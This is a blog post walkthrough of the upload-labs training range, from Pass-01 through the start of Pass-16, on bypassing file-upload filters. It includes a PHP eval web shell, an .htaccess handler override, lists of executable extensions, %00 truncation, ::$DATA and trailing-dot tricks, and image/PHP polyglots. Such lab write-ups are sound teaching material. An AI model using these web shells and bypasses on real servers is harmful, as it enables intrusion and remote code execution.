<!DOCTYPE html>
<html class="has-navbar-fixed-top">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
<title>Upload-labs-Writeup - Threezh1&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">




<meta name="description" content="Share learn & Share life.">



<meta name="keywords" content="Threezh1">



    <meta name="description" content="Upload-labs &amp;#x9879;&amp;#x76EE;&amp;#x5730;&amp;#x5740;">
<meta name="keywords" content="Writeup,upload-labs">
<meta property="og:type" content="article">
<meta property="og:title" content="Upload-labs-Writeup">
<meta property="og:url" content="http://yoursite.com/2019/04/16/Upload-labs-Writeup/index.html">
<meta property="og:site_name" content="Threezh1&#39;s blog">
<meta property="og:description" content="Upload-labs &amp;#x9879;&amp;#x76EE;&amp;#x5730;&amp;#x5740;">
<meta property="og:locale" content="Chinese">
<meta property="og:image" content="https://github.com/c0ny1/upload-labs/raw/master/doc/mind-map.png">
<meta property="og:image" content="https://github.com/c0ny1/upload-labs/raw/master/doc/sum_up.png">
<meta property="og:image" content="https://i.loli.net/2019/04/19/5cb9e25491567.png">
<meta property="og:updated_time" content="2020-02-12T14:05:56.760Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Upload-labs-Writeup">
<meta name="twitter:description" content="Upload-labs &amp;#x9879;&amp;#x76EE;&amp;#x5730;&amp;#x5740;">
<meta name="twitter:image" content="https://github.com/c0ny1/upload-labs/raw/master/doc/mind-map.png">





<link rel="icon" href="/favicon.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">

<link rel="stylesheet" href="/css/style.css">

<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>


    
    
    
    
    
    
    
    
    


</head>
<body>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                <img src="/images/logo.png" alt height="28">
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item " href="/archives">归档</a>
            
            <a class="navbar-item " href="/Projects">项目</a>
            
            <a class="navbar-item " href="/Life">生活</a>
            
            <a class="navbar-item " href="/Photography">摄影</a>
            
            <a class="navbar-item " href="/about">关于</a>
            
            <a class="navbar-item " href="http://121.36.32.184/">Threeday</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            <a class="navbar-item search" title="Suche" href="javascript:;">
                <i class="fas fa-search"></i>
            </a>
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Inhaltsverzeichnis">
                    <i class="fa fa-list"></i>
                </a>
                <div class="navbar-dropdown is-right">
                    
                    
                    
                    
                    <a class="navbar-item" href="#基础知识">1&nbsp;&nbsp;<b>基础知识</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#Upload">2&nbsp;&nbsp;<b>Upload</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-01">2.1&nbsp;&nbsp;Pass-01</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-02">2.2&nbsp;&nbsp;Pass-02</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-03">2.3&nbsp;&nbsp;Pass-03</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-04">2.4&nbsp;&nbsp;Pass-04</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-05">2.5&nbsp;&nbsp;Pass-05</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-06">2.6&nbsp;&nbsp;Pass-06</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-07">2.7&nbsp;&nbsp;Pass-07</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-08">2.8&nbsp;&nbsp;Pass-08</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-09">2.9&nbsp;&nbsp;Pass-09</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-10">2.10&nbsp;&nbsp;Pass-10</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-11">2.11&nbsp;&nbsp;Pass-11</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-12">2.12&nbsp;&nbsp;Pass-12</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-13">2.13&nbsp;&nbsp;Pass-13</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-14">2.14&nbsp;&nbsp;Pass-14</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-15">2.15&nbsp;&nbsp;Pass-15</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-16">2.16&nbsp;&nbsp;Pass-16</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-17">2.17&nbsp;&nbsp;Pass-17</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-18">2.18&nbsp;&nbsp;Pass-18</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-19">2.19&nbsp;&nbsp;Pass-19</a>
                    
                    
                    
                    <a class="navbar-item" href="#Pass-20">2.20&nbsp;&nbsp;Pass-20</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#总结">3&nbsp;&nbsp;<b>总结</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" title="GitHub" href="https://github.com/Threezh1">
                
                <i class="fab fa-github"></i>
                
            </a>
               
            
        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            Upload-labs-Writeup
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-04-16T04:00:00.000Z" itemprop="datePublished">Apr 16 2019</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
        </span>
        
        
        <span class="column is-narrow">
            
            
            19 minutes lesen (Über 2891 Wörter)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <ul>
<li><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">Upload-labs &#x9879;&#x76EE;&#x5730;&#x5740;</a><a id="more"></a>
</li>
</ul>
<h2 id="&#x57FA;&#x7840;&#x77E5;&#x8BC6;"><a href="#&#x57FA;&#x7840;&#x77E5;&#x8BC6;" class="headerlink" title="&#x57FA;&#x7840;&#x77E5;&#x8BC6;"></a>&#x57FA;&#x7840;&#x77E5;&#x8BC6;</h2><p><strong>&#x9776;&#x673A;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#x7C7B;&#x578B;&#x5206;&#x7C7B;</strong></p>
<p><img src="https://github.com/c0ny1/upload-labs/raw/master/doc/mind-map.png" alt="&#x6F0F;&#x6D1E;&#x7C7B;&#x578B;"></p>
<p><strong>&#x5982;&#x4F55;&#x5224;&#x65AD;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x7C7B;&#x578B;</strong></p>
<p><img src="https://github.com/c0ny1/upload-labs/raw/master/doc/sum_up.png" alt="&#x5224;&#x65AD;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x7C7B;&#x578B;"></p>
<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>&#x5C1D;&#x8BD5;&#x4E0A;&#x4F20;&#x4E86;&#x4E00;&#x4E2A;PHP&#xFF0C;&#x53CD;&#x5E94;&#x5F88;&#x5FEB;&#x5F39;&#x51FA;&#x683C;&#x5F0F;&#x8981;&#x6C42;&#x7A97;&#x53E3;&#x3002;&#x518D;&#x6839;&#x636E;&#x7F51;&#x9875;&#x6E90;&#x7801;&#x5224;&#x65AD;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x4F7F;&#x7528;&#x4E86;JS&#x5224;&#x65AD;&#x3002;</p>
<ol>
<li>&#x7528;Brupsuite&#x6293;&#x5305;</li>
<li>&#x7136;&#x540E;&#x5C06;filename&#x4FEE;&#x6539;&#x4E3A;&#x201C;shell.php&#x201D;</li>
<li>&#x5728;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x91CC;&#x6DFB;&#x52A0;<code>&lt;?php eval($_POST[three])?&gt;</code></li>
<li>&#x4E0A;&#x4F20;&#x4E4B;&#x540E;&#x7528;&#x83DC;&#x5200;&#x8FDE;&#x63A5;</li>
</ol>
<p>&#x8FD9;&#x4E2A;&#x9664;&#x4E86;js&#x4E4B;&#x5916;&#x90FD;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x68C0;&#x67E5;&#x3002;</p>
<h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>&#x548C;&#x7B2C;&#x4E00;&#x5173;&#x4E00;&#x6837;&#xFF0C;&#x5C1D;&#x8BD5;&#x4E86;&#x4E00;&#x4E2A;php&#x540E;&#xFF0C;&#x63D0;&#x793A;&#xFF1A;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x4E0D;&#x6B63;&#x786E;&#xFF0C;&#x8BF7;&#x91CD;&#x65B0;&#x4E0A;&#x4F20;&#xFF01;</p>
<p>&#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x73B0;&#x76F8;&#x5173;&#x7684;JS&#x4EE3;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x5E94;&#x8BE5;&#x662F;&#x5728;&#x670D;&#x52A1;&#x7AEF;&#x68C0;&#x67E5;&#x3002;</p>
<p>&#x548C;&#x7B2C;&#x4E00;&#x5173;&#x4E00;&#x6837;&#x7684;&#x6B65;&#x9AA4;&#x3002;</p>
<ol>
<li>&#x7528;Brupsuite&#x6293;&#x5305;</li>
<li>&#x7136;&#x540E;&#x5C06;filename&#x4FEE;&#x6539;&#x4E3A;&#x201C;shell.php&#x201D;</li>
<li>&#x5728;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x91CC;&#x6DFB;&#x52A0;<code>&lt;?php eval($_POST[three])?&gt;</code></li>
<li>&#x4E0A;&#x4F20;&#x4E4B;&#x540E;&#x7528;&#x83DC;&#x5200;&#x8FDE;&#x63A5;</li>
</ol>
<p>&#x770B;&#x4E86;&#x6E90;&#x7801;&#x540E;&#x53D1;&#x73B0;&#xFF1A;</p>
<p><code>if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;))</code></p>
<p>&#x5B83;&#x53EA;&#x5224;&#x65AD;&#x4E86;&#x6570;&#x636E;&#x5305;&#x7684;MIME&#x3002;&#x5374;&#x6CA1;&#x6709;&#x5BF9;&#x540E;&#x7F00;&#x540D;&#x8FDB;&#x884C;&#x68C0;&#x67E5;&#x3002;</p>
<h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;php&#xFF0C;&#x63D0;&#x793A;&#xFF1A;&#x4E0D;&#x5141;&#x8BB8;&#x4E0A;&#x4F20;.asp,.aspx,.php,.jsp&#x540E;&#x7F00;&#x6587;&#x4EF6;&#xFF01; &#x5C5E;&#x4E8E;&#x9ED1;&#x540D;&#x5355;&#x7C7B;&#x578B;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x4E0A;&#x4F20;&#x7279;&#x6B8A;&#x53EF;&#x89E3;&#x6790;&#x540E;&#x7F00;&#xFF0C;</p>
<p>&#x4F8B;&#x5982;<code>.phtml</code> &#x6216;&#x8005; <code>.php2</code></p>
<p>&#x4E24;&#x79CD;&#x7C7B;&#x578B;&#x90FD;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x88AB;&#x89E3;&#x6790;&#x3002;</p>
<p>&#x53EF;&#x80FD;&#x662F;&#x7531;&#x4E8E;&#x6211;&#x914D;&#x7F6E;&#x7684;&#x7F18;&#x6545;&#xFF0C;&#x6CA1;&#x6709;&#x6210;&#x529F;&#x88AB;&#x89E3;&#x6790;&#x3002;orz&#xFF0C;&#x4E0D;&#x6562;&#x518D;&#x7EE7;&#x7EED;&#x914D;&#x7F6E;&#x4E0B;&#x53BB;&#x4E86;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x6536;&#x96C6;&#x4E86;&#x4E00;&#x4E9B;&#x53EF;&#x88AB;PHP&#x89E3;&#x6790;&#x5668;&#x89E3;&#x6790;&#x6267;&#x884C;&#x7684;&#x540E;&#x7F00;&#x540D;&#xFF1A;</p>
<ul>
<li><p><code>.php*</code>&#x7C7B;:</p>
<ul>
<li>.php. ubuntu 12.04 lts LAMP bypass with .php.</li>
<li>.php3</li>
<li>.php4</li>
<li>.php5</li>
<li>.php6</li>
<li>.php7</li>
</ul>
</li>
<li><p><code>.ph*</code>&#x7C7B;</p>
<ul>
<li>.pht</li>
<li>.phtm</li>
<li>.phtml</li>
</ul>
</li>
<li><p>&#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#x7C7B;</p>
<ul>
<li>.php.gif</li>
<li>.jpg%00.php</li>
</ul>
</li>
</ul>
<h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>&#x5C1D;&#x8BD5;&#x4E0A;&#x4F20;&#x4E86;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x540E;&#x7F00;&#x540D;&#xFF0C;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x9ED1;&#x540D;&#x5355;&#x3002;</p>
<p>&#x67E5;&#x770B;&#x4E86;&#x63D0;&#x793A;&#x4E4B;&#x540E;&#x53D1;&#x73B0;&#xFF0C;&#x9ED1;&#x540D;&#x5355;&#x5217;&#x4E3E;&#x4E86;&#x51E0;&#x4E4E;&#x6240;&#x6709;&#x80FD;&#x4F7F;&#x7528;&#x7684;&#x683C;&#x5F0F;&#x3002;</p>
<p>&#x5C1D;&#x8BD5;&#x4E0A;&#x4F20;.htaccess&#x6587;&#x4EF6;&#xFF1F;</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;evil.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>&#x53EF;&#x4EE5;&#x5C06;evil.jpg&#x6587;&#x4EF6;&#x89E3;&#x6790;&#x4E3A;php</p>
<p>&#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#xFF1A;</p>
<ol>
<li>&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;evil.php:.jpg&#x6587;&#x4EF6;&#xFF0C;&#x4E0A;&#x4F20;&#x76EE;&#x5F55;&#x4E0B;&#x4F1A;&#x5B58;&#x5728;&#x4E00;&#x4E2A;evil.php&#x7684;&#x7A7A;&#x6587;&#x4EF6;</li>
<li>&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;evil.&lt;&#x6216;evil.&lt;&lt;&lt;&#x6216;evil.&gt;&gt;&gt;&#x6216;evil.&gt;&gt;&lt;&#x540E;&#x518D;&#x6B21;&#x4E0A;&#x4F20;&#xFF0C;&#x91CD;&#x5199;evil.php</li>
<li>&#x83DC;&#x5200;&#x94FE;&#x63A5;</li>
</ol>
<h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>&#x4F1A;&#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x91CD;&#x547D;&#x540D;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x6CD5;&#x7528;&#x7B2C;&#x56DB;&#x5173;&#x7684;&#x7B2C;&#x4E8C;&#x79CD;&#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x5F97;&#x7528;&#x5927;&#x5C0F;&#x5199;&#x7ED5;&#x8FC7;&#xFF0C;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;.PHp&#x6216;&#x8005;&#x5176;&#x4ED6;&#x540D;&#x79F0;&#x90FD;&#x884C;&#x3002;</p>
<h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>&#x589E;&#x52A0;&#x70B9;&#x548C;&#x7A7A;&#x683C;&#xFF0C;&#x5199;&#x6210; <code>evil.php.</code></p>
<p>&#x4F46;&#x662F;&#x8FD9;&#x6837;&#x4E0A;&#x4F20;&#x4E4B;&#x540E;&#x53EA;&#x4F1A;&#x53D8;&#x6210;&#x6CA1;&#x6709;&#x540E;&#x7F00;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x53EF;&#x80FD;&#x53EA;&#x662F;&#x73AF;&#x5883;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>&#x7981;&#x6B62;&#x4E86;&#x4E00;&#x5207;&#x53EF;&#x6267;&#x884C;&#x7684;&#x540E;&#x7F00;</p>
<p>&#x7528;&#x7B2C;6&#x9898;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5728;&#x540E;&#x7F00;&#x540D;&#x7684;&#x5730;&#x65B9;&#x52A0;&#x70B9;&#x3002;</p>
<p>&#x5F88;&#x5947;&#x602A;&#x7684;&#x662F;&#xFF0C;&#x8FD9;&#x4E2A;&#x5374;&#x6210;&#x529F;&#x5199;&#x5165;&#x4E86;&#xFF0C;&#x7B2C;&#x516D;&#x9898;&#x5374;&#x4E0D;&#x884C;&#x3002;</p>
<p>&#x4ECE;&#x6E90;&#x7801;&#x6765;&#x770B;&#xFF1A;</p>
<p>&#x7B2C;&#x516D;&#x9898;&#x591A;&#x4E86;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF1A;<code>$file_name = deldot($file_name);//&#x5220;&#x9664;&#x6587;&#x4EF6;&#x540D;&#x672B;&#x5C3E;&#x7684;&#x70B9;</code></p>
<p>&#x7B2C;&#x4E03;&#x9898;&#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x7528;&#x52A0;&#x70B9;&#x3002;</p>
<h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>&#x4F7F;&#x7528;Windows&#x6587;&#x4EF6;&#x6D41;&#x7279;&#x6027;&#x7ED5;&#x8FC7;</p>
<ol>
<li>&#x6587;&#x4EF6;&#x540D;&#x6539;&#x6210; <code>evil.php::$DATA</code></li>
<li>&#x4E0A;&#x4F20;&#x540E;&#x7684;&#x56FE;&#x7247;&#x540D;&#x79F0;&#x4E3A;&#xFF1A;<code>evil.php</code>(&#x8FD9;&#x9898;&#x4F1A;&#x53D8;&#x6210;&#x4FEE;&#x6539;&#x56FE;&#x7247;&#x540D;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x90FD;&#x662F;php)</li>
</ol>
<h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>&#x540C;&#x7B2C;6&#x5173;&#xFF0C;&#x4FEE;&#x6539;&#x540E;&#x7F00;&#x540D;&#x4E3A;&#xFF1A;<code>evil.php. .</code></p>
<p>&#x4E0A;&#x4F20;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x4E3A;php</p>
<p>&#x4ECE;&#x6E90;&#x7801;&#x6765;&#x770B;&#xFF1A;</p>
<p>&#x76F8;&#x6BD4;&#x7B2C;&#x516D;&#x5173;&#xFF0C;&#x591A;&#x4E86;&#x4E00;&#x4E2A;<code>$file_ext = trim($file_ext); //&#x9996;&#x5C3E;&#x53BB;&#x7A7A;</code></p>
<p>&#x5F53;<code>. .</code>&#x5148;&#x53BB;&#x4E86;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x518D;&#x9996;&#x5C3E;&#x53BB;&#x7A7A;&#xFF0C;&#x5C31;&#x548C;&#x7B2C;&#x4E03;&#x5173;&#x4E00;&#x6837;&#x53EA;&#x5269;&#x4E0B;&#x4E00;&#x4E2A;&#x70B9;&#x6210;&#x529F;&#x4E0A;&#x4F20;&#x3002;</p>
<h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>&#x4ECE;&#x6E90;&#x7801;&#x4E0A;&#x770B;&#xFF0C;&#x4F1A;&#x5220;&#x9664;&#x9ED1;&#x540D;&#x5355;&#x7684;&#x5B58;&#x5728;&#x7684;&#x540E;&#x7F00;&#x3002;&#x53CC;&#x5199;&#x7ED5;&#x8FC7;</p>
<p>&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x540D;&#x6539;&#x4E3A;&#xFF1A;<code>evil.phphpp</code></p>
<h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x6BD4;&#x8F83;&#x9E21;&#x808B;&#x3002;&#x5229;&#x7528;&#x7684;&#x73AF;&#x5883;&#x5F97;&#x5148;&#x6709;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#xFF1A;</p>
<ol>
<li>PHP&#x7248;&#x672C;&#x5C0F;&#x4E8E;5.3.4</li>
<li>PHP&#x7684;magic_quotes_gpc&#x4E3A;OFF&#x72B6;&#x6001;</li>
</ol>
<p>&#x8FD9;&#x91CC;&#x5229;&#x7528;&#x7684;&#x662F;%00&#x622A;&#x65AD;&#x3002;</p>
<p>&#x53EF;&#x77E5;&#xFF1A;</p>
<ol>
<li>&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x7684;&#x8DEF;&#x5F84;&#x53EF;&#x63A7;</li>
<li>&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x65F6;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x63A7;</li>
</ol>
<p>&#x4E8E;&#x662F;&#x5728;&#x8DEF;&#x5F84;&#x5904;&#xFF0C;&#x5C06;<code>../upload/</code>&#x6539;&#x4E3A;&#xFF1A;<code>../upload/evil.php%00</code></p>
<p>&#x6587;&#x4EF6;&#x540D;&#x4E3A;&#x6B63;&#x5E38;&#x7684;jpg&#x540E;&#x7F00;&#xFF0C;&#x4E0A;&#x4F20;&#x540E;&#x53EF;&#x5F97;&#x5230;&#xFF1A;<code>../upload/evil.php</code></p>
<p>&#x56E0;&#x4E3A;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x8BFB;&#x5230;%00&#x4F1A;&#x5F53;&#x505A;&#x7ED3;&#x675F;&#x7B26;&#x800C;&#x628A;&#x540E;&#x9762;&#x7684;&#x6570;&#x636E;&#x76F4;&#x63A5;&#x5FFD;&#x7565;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x751F;&#x6210;&#x4E86;evil.php</p>
<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>&#x548C;11&#x5173;&#x4E00;&#x6837;&#x7684;&#x4F7F;&#x7528;&#x622A;&#x65AD;&#x7ED5;&#x8FC7;&#xFF0C;&#x4F46;&#x8FD9;&#x91CC;&#x662F;&#x5229;&#x7528;Brupsuite&#x7684;Hex&#x529F;&#x80FD;&#x3002;</p>
<ol>
<li>&#x5728;&#x4FDD;&#x5B58;&#x7684;&#x8DEF;&#x5F84;&#x5904;&#xFF0C;&#x5C06;<code>../upload/</code>&#x6539;&#x4E3A;&#xFF1A;<code>../upload/evil.php</code>(&#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x7A7A;&#x683C;)</li>
<li>&#x4F7F;&#x7528;Brupsuite&#x7684;Hex&#xFF0C;&#x5C06;&#x5BF9;&#x5E94;&#x7A7A;&#x683C;&#x5904;&#x7684;20&#x6539;&#x4E3A;00</li>
<li>&#x4E0A;&#x4F20;</li>
</ol>
<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>&#x8FD9;&#x4E00;&#x5173;&#x7684;&#x4EFB;&#x52A1;&#x597D;&#x50CF;&#x589E;&#x52A0;&#x4E86;&#x5440;&#xFF0C;&#x8981;.jpg,.png,.gif&#x90FD;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#x624D;&#x7B97;&#x8FC7;&#x5173;&#x3002;</p>
<ol>
<li>GIF&#x56FE;&#x7247;&#x683C;&#x5F0F;&#x6700;&#x7B80;&#x5355;&#xFF1A;<code>GIF89a&lt;?php phpinfo(); ?&gt;</code> .gif&#x540E;&#x7F00;&#x4E0A;&#x4F20;&#x5373;&#x53EF;</li>
<li><p>JPG&#xFF1A;</p>
<ul>
<li>&#x51C6;&#x5907;&#x4E00;&#x4E2A;&#x4E00;&#x53E5;&#x8BDD;&#xFF0C;&#x4E00;&#x4E2A;jpg&#x56FE;&#x7247;</li>
<li>&#x4F7F;&#x7528;&#xFF1A;<code>copy 1.jpg /b + 2.php /a evil.jpg</code>&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x5E26;&#x6709;&#x4E00;&#x53E5;&#x8BDD;&#x7684;jpg</li>
</ul>
</li>
<li><p>PNG&#xFF1A;&#x548C;JPG&#x4E00;&#x6837;&#x7684;&#x64CD;&#x4F5C;</p>
</li>
</ol>
<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>&#x63D0;&#x793A;&#xFF1A;&#x672C;pass&#x4F7F;&#x7528;getimagesize()&#x68C0;&#x67E5;&#x662F;&#x5426;&#x4E3A;&#x56FE;&#x7247;&#x6587;&#x4EF6;&#xFF01;</p>
<p>&#x548C;13&#x5173;&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002;</p>
<h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>&#x63D0;&#x793A;&#xFF1A;&#x672C;pass&#x4F7F;&#x7528;exif_imagetype()&#x68C0;&#x67E5;&#x662F;&#x5426;&#x4E3A;&#x56FE;&#x7247;&#x6587;&#x4EF6;&#xFF01;</p>
<p>&#x548C;13&#x5173;&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002;</p>
<h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>&#x63D0;&#x793A;&#xFF1A;&#x672C;pass&#x91CD;&#x65B0;&#x6E32;&#x67D3;&#x4E86;&#x56FE;&#x7247;&#xFF01;</p>
<p>&#x8FD9;&#x91CC;&#x5C31;&#x662F;DDCTF&#x7B2C;&#x4E09;&#x9898;&#x7684;&#x8003;&#x70B9;&#xFF0C;&#x56FE;&#x7247;&#x7684;&#x4E8C;&#x6B21;&#x6E32;&#x67D3;&#x3002;</p>
<ul>
<li><p>GIF&#x7684;&#x56FE;&#x7684;&#x53C8;&#x662F;&#x6700;&#x7B80;&#x5355;&#x7684;&#xFF1A;</p>
<ul>
<li>&#x5BFB;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x6E32;&#x67D3;&#x540E;&#x6CA1;&#x6709;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x7684;&#x90E8;&#x5206;</li>
<li><p>&#x5C06;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x63D2;&#x5165;</p>
<p>(&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Brupsuite&#x6765;&#x5BF9;&#x6BD4;&#x4E24;&#x4E2A;&#x56FE;&#x7247;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x5BFB;&#x627E;&#x5230;&#x6CA1;&#x6709;&#x6539;&#x53D8;&#x7684;&#x533A;&#x57DF;)</p>
</li>
</ul>
</li>
<li><p>PNG&#xFF1A;</p>
<ul>
<li>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7528;&#x56FD;&#x5916;&#x7684;&#x811A;&#x672C;</li>
</ul>
</li>
</ul>
